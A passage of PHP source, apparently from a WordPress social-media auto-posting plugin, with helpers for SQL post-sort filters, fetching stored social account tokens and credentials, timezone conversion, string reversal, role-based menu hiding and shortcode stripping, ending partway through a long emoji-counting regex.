					$last_shared_post_id = DB::DB()->get_row( 'SELECT `post_id` FROM `' . DB::table( 'feeds' ) . '` WHERE `schedule_id` = "' . ( int ) $scheduleId . '" ORDER BY `id` DESC LIMIT 1', ARRAY_A );

					if ( ! empty( $last_shared_post_id[ 'post_id' ] ) )
					{
						$last_post_date = Date::dateTimeSQL( get_the_date( 'Y-m-d H:i:s', $last_shared_post_id[ 'post_id' ] ) );

						if ( $last_post_date )
						{
							$sortQuery .= " AND post_date > '" . $last_post_date . "' ";
						}
					}

					$sortQuery .= 'ORDER BY post_date ASC';
					break;
				case "new_first":
					$last_shared_post_id = DB::DB()->get_row( 'SELECT `post_id` FROM `' . DB::table( 'feeds' ) . '` WHERE `schedule_id` = "' . ( int ) $scheduleId . '" ORDER BY `id` DESC LIMIT 1', ARRAY_A );

					if ( ! empty( $last_shared_post_id[ 'post_id' ] ) )
					{
						$last_post_date = Date::dateTimeSQL( get_the_date( 'Y-m-d H:i:s', $last_shared_post_id[ 'post_id' ] ) );

						if ( $last_post_date )
						{
							$sortQuery .= " AND post_date < '" . $last_post_date . "' ";
						}
					}

					$sortQuery .= 'ORDER BY post_date DESC';
					break;
			}
		}

		return "{$postIDFilter} {$postTypeFilter} {$categoriesFilter} {$dateFilter} {$sortQuery}";
	}

	public static function getAccessToken ( $nodeType, $nodeId )
	{
		if ( $nodeType === 'account' )
		{
			$node_info     = DB::fetch( 'accounts', $nodeId );
			$nodeProfileId = $node_info[ 'profile_id' ];
			$n_accountId   = $nodeProfileId;

			$accessTokenGet    = DB::fetch( 'account_access_tokens', [ 'account_id' => $nodeId ] );
			$accessToken       = isset( $accessTokenGet ) && array_key_exists( 'access_token', $accessTokenGet ) ? $accessTokenGet[ 'access_token' ] : '';
			$accessTokenSecret = isset( $accessTokenGet ) && array_key_exists( 'access_token_secret', $accessTokenGet ) ? $accessTokenGet[ 'access_token_secret' ] : '';
			$appId             = isset( $accessTokenGet ) && array_key_exists( 'app_id', $accessTokenGet ) ? $accessTokenGet[ 'app_id' ] : '';
			$driver            = $node_info[ 'driver' ];
			$username          = $node_info[ 'username' ];
			$password          = $node_info[ 'password' ];
			$name              = $node_info[ 'name' ];
			$proxy             = $node_info[ 'proxy' ];
			$options           = $node_info[ 'options' ];
			$poster_id         = NULL;

			if ( $driver === 'reddit' )
			{
				$accessToken = Reddit::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'ok' )
			{
				$accessToken = OdnoKlassniki::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'medium' )
			{
				$accessToken = Medium::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'google_b' && empty( $options ) )
			{
				$accessToken = GoogleMyBusinessAPI::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'blogger' )
			{
				$accessToken = Blogger::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'pinterest' )
			{
				$accessToken = Pinterest::accessToken( $accessTokenGet );
			}
			else if ( $driver === 'linkedin' )
			{
				$accessToken = Linkedin::accessToken( $nodeId, $accessTokenGet );
			}
		}
		else
		{
			$node_info    = DB::fetch( 'account_nodes', $nodeId );
			$account_info = DB::fetch( 'accounts', $node_info[ 'account_id' ] );

			if ( $node_info )
			{
				$node_info[ 'proxy' ] = $account_info[ 'proxy' ];
			}

			$name        = $account_info[ 'name' ];
			$username    = $account_info[ 'username' ];
			$password    = $account_info[ 'password' ];
			$proxy       = $account_info[ 'proxy' ];
			$options     = $account_info[ 'options' ];
			$n_accountId = $account_info[ 'profile_id' ];
			$poster_id   = NULL;

			$nodeProfileId     = $node_info[ 'node_id' ];
			$driver            = $node_info[ 'driver' ];
			$appId             = 0;
			$accessTokenSecret = '';

			if ( $driver === 'fb' && $node_info[ 'node_type' ] === 'ownpage' )
			{
				$accessToken = $node_info[ 'access_token' ];
			}
			else
			{
				$accessTokenGet    = DB::fetch( 'account_access_tokens', [ 'account_id' => $node_info[ 'account_id' ] ] );
				$accessToken       = isset( $accessTokenGet ) && array_key_exists( 'access_token', $accessTokenGet ) ? $accessTokenGet[ 'access_token' ] : '';
				$accessTokenSecret = isset( $accessTokenGet ) && array_key_exists( 'access_token_secret', $accessTokenGet ) ? $accessTokenGet[ 'access_token_secret' ] : '';
				$appId             = isset( $accessTokenGet ) && array_key_exists( 'app_id', $accessTokenGet ) ? $accessTokenGet[ 'app_id' ] : '';

				if ( $driver === 'reddit' )
				{
					$accessToken = Reddit::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'ok' )
				{
					$accessToken = OdnoKlassniki::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'medium' )
				{
					$accessToken = Medium::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'google_b' && empty( $options ) )
				{
					$accessToken = GoogleMyBusinessAPI::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'blogger' )
				{
					$accessToken = Blogger::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'pinterest' )
				{
					$accessToken = Pinterest::accessToken( $accessTokenGet );
				}
				else if ( $driver === 'linkedin' )
				{
					$accessToken = Linkedin::accessToken( $node_info[ 'account_id' ], $accessTokenGet );
				}
				else if ( $driver === 'fb' && $nodeType === 'group' && isset( $node_info[ 'poster_id' ] ) && $node_info[ 'poster_id' ] > 0 )
				{
					$poster_id = $node_info[ 'poster_id' ];
				}
			}

			if ( $driver === 'vk' )
			{
				$nodeProfileId = '-' . $nodeProfileId;
			}
		}

		$node_info[ 'node_type' ] = empty( $node_info[ 'node_type' ] ) ? 'account' : $node_info[ 'node_type' ];

		return [
			'id'                  => $nodeId,
			'node_id'             => $nodeProfileId,
			'node_type'           => $nodeType,
			'access_token'        => $accessToken,
			'access_token_secret' => $accessTokenSecret,
			'app_id'              => $appId,
			'driver'              => $driver,
			'info'                => $node_info,
			'username'            => $username,
			'password'            => $password,
			'proxy'               => $proxy,
			'options'             => $options,
			'account_id'          => $n_accountId,
			'poster_id'           => $poster_id,
			'name'                => $name
		];
	}

	public static function localTime2UTC ( $dateTime )
	{
		$timezone_string = get_option( 'timezone_string' );
		if ( ! empty( $timezone_string ) )
		{
			$wpTimezoneStr = $timezone_string;
		}
		else
		{
			$offset  = get_option( 'gmt_offset' );
			$hours   = (int) $offset;
			$minutes = abs( ( $offset - (int) $offset ) * 60 );
			$offset  = sprintf( '%+03d:%02d', $hours, $minutes );

			$wpTimezoneStr = $offset;
		}

		$dateTime = new DateTime( $dateTime, new DateTimeZone( $wpTimezoneStr ) );
		$dateTime->setTimezone( new DateTimeZone( date_default_timezone_get() ) );

		return $dateTime->getTimestamp();
	}

	public static function mb_strrev ( $str )
	{
		$r = '';
		for ( $i = mb_strlen( $str ); $i >= 0; $i-- )
		{
			$r .= mb_substr( $str, $i, 1 );
		}

		return $r;
	}

	public static function isHiddenUser ()
	{
		$hideFSPosterForRoles = explode( '|', Helper::getOption( 'hide_menu_for', '' ) );

		$userInf   = wp_get_current_user();
		$userRoles = (array) $userInf->roles;

		if ( ! in_array( 'administrator', $userRoles ) )
		{
			foreach ( $userRoles as $roleId )
			{
				if ( in_array( $roleId, $hideFSPosterForRoles ) )
				{
					return TRUE;
				}
			}
		}

		return FALSE;
	}

	public static function removePageBuilderShortcodes ( $message )
	{
		$message = str_replace( [
			'[[',
			']]'
		], [
			'&#91;&#91;',
			'&#93;&#93;'
		], $message );

		$message = preg_replace( [ '/\[(.+)]/', '/<!--(.*?)-->/' ], '', $message );

		$message = str_replace( [
			'&#91;&#91;',
			'&#93;&#93;'
		], [
			'[[',
			']]'
		], $message );

		return $message;
	}

	/**
	 * Check the time if is between two times
	 *
	 * @param $time int time to check
	 * @param $start int start time to compare
	 * @param $end int end time to compare
	 *
	 * @return bool if given time is between two dates, then true, otherwise false
	 */
	public static function isBetweenDates ( $time, $start, $end )
	{
		if ( $start < $end )
		{
			return $time >= $start && $time <= $end;
		}
		else
		{
			return $time <= $end || $time >= $start;
		}
	}

	public static function count_emojis ( $text )
	{
		try
		{
			preg_match_all( '/\x{1f468}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f48b}\x{200d}\x{1f468}|\x{1f469}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f48b}\x{200d}\x{1f469}|\x{1f469}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f48b}\x{200d}\x{1f468}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fe}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fd}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fc}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fb}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3ff}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fd}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fc}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f3f4}\x{e0067}\x{e0062}\x{e0077}\x{e006c}\x{e0073}\x{e007f}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f468}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f468}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f469}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3ff}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fb}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fe}|\x{1f468}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fd}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fe}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fd}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fc}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fb}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3ff}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fe}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fc}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fb}|\x{1f9d1}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fb}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3ff}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fe}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fd}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fc}|\x{1f9d1}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fb}|\x{1f9d1}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3ff}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fd}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fc}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fe}|\x{1f469}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fb}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3ff}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fe}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fd}|\x{1f469}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fb}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3ff}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fd}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fe}|\x{1f469}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f469}\x{1f3fc}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3ff}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fe}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fd}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fc}|\x{1f9d1}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fb}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3ff}|\x{1f468}\x{1f3fb}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f9d1}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f9d1}\x{1f3fc}|\x{1f468}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{200d}\x{2764}\x{200d}\x{1f48b}\x{200d}\x{1f468}|\x{1f468}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f469}\x{200d}\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f467}|\x{1f469}\x{200d}\x{1f469}\x{200d}\x{1f466}\x{200d}\x{1f466}|\x{1f469}\x{200d}\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f466}|\x{1f468}\x{200d}\x{1f468}\x{200d}\x{1f467}\x{200d}\x{1f467}|\x{1f3f4}\x{e0067}\x{e0062}\x{e0065}\x{e006e}\x{e0067}\x{e007f}|\x{1f468}\x{200d}\x{1f468}\x{200d}\x{1f467}\x{200d}\x{1f466}|\x{1f468}\x{200d}\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f467}|\x{1f468}\x{200d}\x{1f469}\x{200d}\x{1f466}\x{200d}\x{1f466}|\x{1f468}\x{200d}\x{1f469}\x{200d}\x{1f467}\x{200d}\x{1f466}|\x{1f469}\x{200d}\x{2764}\x{200d}\x{1f48b}\x{200d}\x{1f469}|\x{1f468}\x{200d}\x{2764}\x{200d}\x{1f48b}\x{200d}\x{1f468}|\x{1f468}\x{200d}\x{1f468}\x{200d}\x{1f466}\x{200d}\x{1f466}|\x{1f468}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f468}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f468}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f468}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fd}|\x{1f468}\x{1f3fc}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f468}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f468}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f468}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fe}|\x{1f468}\x{1f3fd}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f468}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f468}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f3f4}\x{e0067}\x{e0062}\x{e0073}\x{e0063}\x{e0074}\x{e007f}|\x{1f468}\x{1f3fe}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3ff}|\x{1f468}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fc}|\x{1f468}\x{1f3ff}\x{200d}\x{1f91d}\x{200d}\x{1f468}\x{1f3fb}|\x{1f469}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f469}|\x{1f469}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f468}|\x{1f468}\x{200d}\x{2764}\x{fe0f}\x{200d}\x{1f468}|\x{1f471}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f471}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f471}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f3cc}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f477}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f937}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f937}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f477}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9ce}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f926}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f64d}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f64d}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f926}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f9cd}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f64d}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f926}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f575}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f926}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f3cc}\x{fe0f}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f471}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f471}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f471}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f482}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f9cd}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d7}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f6b6}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9d7}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f482}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f937}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f487}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f487}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fc}\x{200d}\x{2695}\x{fe0f}|\x{1f487}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f64d}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f6a3}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f3c4}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fd}\x{200d}\x{2695}\x{fe0f}|\x{1f6a3}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f487}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f469}\x{1f3fe}\x{200d}\x{2695}\x{fe0f}|\x{1f486}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f487}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fd}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fe}\x{200d}\x{2695}\x{fe0f}|\x{1f487}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f487}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3ff}\x{200d}\x{2695}\x{fe0f}|\x{1f487}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f3c4}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f487}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f487}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f3c4}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f469}\x{1f3fb}\x{200d}\x{2695}\x{fe0f}|\x{1f6a3}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f486}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f937}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f9d1}\x{1f3fc}\x{200d}\x{2695}\x{fe0f}|\x{1f3cc}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fd}\x{200d}\x{2695}\x{fe0f}|\x{1f3cc}\x{fe0f}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f3cc}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f473}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f9d1}\x{1f3fb}\x{200d}\x{2695}\x{fe0f}|\x{1f6b6}\x{1f3fb}\x{200d}\x{2640}\x{fe0f}|\x{1f6b6}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3fe}\x{200d}\x{2642}\x{fe0f}|\x{1f6b6}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f9d1}\x{1f3fe}\x{200d}\x{2695}\x{fe0f}|\x{1f473}\x{1f3ff}\x{200d}\x{2642}\x{fe0f}|\x{1f6a3}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3ff}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f6b6}\x{1f3fb}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fd}\x{200d}\x{2695}\x{fe0f}|\x{1f6b6}\x{1f3fc}\x{200d}\x{2642}\x{fe0f}|\x{1f468}\x{1f3fc}\x{200d}\x{2695}\x{fe0f}|\x{1f3cc}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f3cc}\x{1f3fc}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3fe}\x{200d}\x{2640}\x{fe0f}|\x{1f468}\x{1f3fb}\x{200d}\x{2695}\x{fe0f}|\x{1f473}\x{1f3fd}\x{200d}\x{2640}\x{fe0f}|\x{1f473}\x{1f3fc}\x{200d}\x{